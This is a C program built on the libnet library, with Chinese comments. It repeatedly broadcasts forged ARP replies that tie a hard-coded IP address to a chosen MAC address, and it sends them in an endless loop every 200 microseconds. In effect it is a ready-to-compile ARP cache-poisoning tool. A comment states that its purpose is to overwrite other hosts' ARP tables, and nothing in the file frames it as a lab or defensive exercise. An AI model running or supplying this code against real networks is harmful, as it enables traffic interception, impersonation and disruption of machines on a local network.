/************************************
author hjj
date 2011-1-20
function: send an arp packet to all machine on local net

modify: wenhao
gcc arp.c -o arp -Wall -lnet
**************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libnet.h>

#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4

int main(int argc,char **argv)
{
        libnet_t *net_t = NULL; //定义libnet_t指针变量
        char *dev = "p2p1"; //定义设备名称
        char err_buf[LIBNET_ERRBUF_SIZE];
        libnet_ptag_t p_tag; //定义libnet_ptag_t变量
        
        //unsigned char src_mac[MAC_ADDR_LEN] = {0x00,0x00,0xf1,0xe8,0x0e,0xc8};//发送者网卡地址
	unsigned char src_mac[MAC_ADDR_LEN] = {0x08,0x00,0x27,0x3e,0x70,0x72};//发送者网卡地址  08:00:27:3e:70:72 
        unsigned char dst_mac[MAC_ADDR_LEN] = {0xff,0xff,0xff,0xff,0xff,0xff};//接收者网卡地址
        char *src_ip_str = "192.168.1.69"; //源主机IP地址
        
/*
        if(argc == 2)
        {
                if(strcmp(argv[1],"-h") == 0||strcmp(argv[1],"--help") == 0)
                {
                        printf("%s","help message");
                }else
                {
                        src_ip_str = argv[1]; //赋值IP地址
                }
        }
*/
	src_ip_str = "192.168.1.217";
        
        unsigned long src_ip,dst_ip = 0;
        
        src_ip = libnet_name2addr4(net_t,src_ip_str,LIBNET_RESOLVE);//将字符串类型的ip转换为顺序网络字节流
       
        net_t  = libnet_init(LIBNET_LINK_ADV, dev, err_buf);//初始化发送包结构       
        if(net_t == NULL)
        {
                printf("libnet_init error\n");
                exit(-1);
        }

        p_tag = libnet_build_arp(
                        ARPHRD_ETHER,//hardware type ethernet
                        ETHERTYPE_IP,//protocol type
                        MAC_ADDR_LEN,//mac length
                        IP_ADDR_LEN,//protocol length
                        ARPOP_REPLY,//op type
                        (u_int8_t *)src_mac,//source mac addr这里的作用是更新目的地的arp表
                        (u_int8_t *)&src_ip,//source ip addr
                        (u_int8_t *)dst_mac,//dest mac addr
                        (u_int8_t *)&dst_ip,//dest ip  addr
                        NULL,//payload
                        0,//payload length
                        net_t,//libnet context
                        0//0 stands to build a new one
        );
        
        if(-1 == p_tag)
        {
                printf("libnet_build_arp error");
                exit(-1);
        }

        //以太网头部
        p_tag = libnet_build_ethernet(//create ethernet header
                        (u_int8_t *)dst_mac,//dest mac addr
                        (u_int8_t *)src_mac,//source mac addr
                        ETHERTYPE_ARP,//protocol type
                        NULL,//payload
                        0,//payload length
                        net_t,//libnet context
                        0//0 to build a new one
        );

        if(-1 == p_tag)
        {
                printf("libnet_build_ethernet error!\n");
                exit(-1);
        }
        

unsigned long count = 0;
int res;
while (1) {
        if(-1 == (res = libnet_write(net_t)))
        {
                printf("libnet_write error!\n");
                exit(-1);
        }
	else
		printf("write %ld times success\n", count++);

	usleep(200);
}
        
        libnet_destroy(net_t);
        return 0;
}
